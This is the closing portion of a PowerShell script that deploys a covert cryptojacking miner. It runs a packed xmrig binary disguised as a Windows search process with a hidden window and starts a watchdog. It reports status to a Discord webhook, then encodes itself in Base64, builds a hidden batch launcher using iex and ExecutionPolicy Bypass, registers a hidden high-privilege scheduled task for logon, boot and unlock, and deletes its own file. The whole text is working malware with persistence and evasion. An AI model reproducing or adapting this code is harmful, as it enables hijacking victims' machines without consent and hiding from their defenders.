    Lock-InstallDirectory
    Start-RandomDelay -Min 1 -Max 3
    Backup-MinerFiles
    Start-RandomDelay -Min 2 -Max 5
    Start-Process -FilePath $minerExe -ArgumentList "--config=`"$configFile`"" -WindowStyle Hidden -PassThru | Out-Null
    Start-Sleep -Seconds 5
    Start-Process -FilePath $watchdogVbs
    Start-Sleep -Seconds 5
    $minerProc = Get-Process | Where-Object { $_.Path -like "*NetworkService*SearchProtocolHost*" }
    if ($minerProc) {
        $deploymentSuccess = $true
        Write-Host "`n[+] DEPLOYMENT SUCCESS" -ForegroundColor Green
        Write-Host "[+] Miner PID: $($minerProc.Id)" -ForegroundColor Green
        Write-Host '[+] Packed binary deployed - no stock xmrig on disk' -ForegroundColor Green
    } else {
        $deploymentError = "Miner not running after start"
        Write-Host "`n[-] DEPLOYMENT FAILED: $deploymentError" -ForegroundColor Red
    }
} catch {
    $deploymentSuccess = $false
    $deploymentError = $_.Exception.Message
    Write-Host "`n[-] DEPLOYMENT FAILED: $deploymentError" -ForegroundColor Red
}

Send-DiscordWebhook -Success $deploymentSuccess -ErrorMsg $deploymentError

if ($deploymentSuccess) {
    try {
        $myPath = $MyInvocation.MyCommand.Definition
        $myContent = Get-Content -Path $myPath -Raw
        $bytes = [System.Text.Encoding]::Unicode.GetBytes($myContent)
        $encoded = [Convert]::ToBase64String($bytes)
        $b64Path = "$installDir\mssearch.b64"
        Set-Content -Path $b64Path -Value $encoded -Force
        $launcherBat = "$installDir\SearchIndexer.bat"
        $launcherCode = "@echo off`r`npowershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"iex([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String((gc '%~dp0mssearch.b64'))))`""
        Set-Content -Path $launcherBat -Value $launcherCode -Force
        $taskXml2 = '<?xml version="1.0" encoding="UTF-16"?><Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><Triggers><LogonTrigger><Enabled>true</Enabled><Delay>PT30S</Delay></LogonTrigger><BootTrigger><Enabled>true</Enabled><Delay>PT60S</Delay></BootTrigger><SessionStateChangeTrigger><Enabled>true</Enabled><StateChange>SessionUnlock</StateChange></SessionStateChangeTrigger></Triggers><Principals><Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Enabled>true</Enabled><Hidden>true</Hidden></Settings><Actions Context="Author"><Exec><Command>"' + $launcherBat + '"</Command></Exec></Actions></Task>'
        $xmlFile2 = "$tempDir\task2.xml"
        Set-Content -Path $xmlFile2 -Value $taskXml2 -Encoding Unicode
        & schtasks /create /tn $taskName /xml "$xmlFile2" /f 2>$null
        Remove-Item "$xmlFile2" -Force -ErrorAction SilentlyContinue
        Remove-Item -Path $selfHealPs1 -Force -ErrorAction SilentlyContinue
        Remove-Item -Path $myPath -Force -ErrorAction SilentlyContinue
        Write-Host "[+] Self-encoded, .ps1 deleted" -ForegroundColor Green
    } catch {
        Write-Host "[!] Self-encode failed: $_" -ForegroundColor Yellow
    }
}

Write-Host "`n[!] Done. v7.5.5 PACKED deployed." -ForegroundColor Cyan
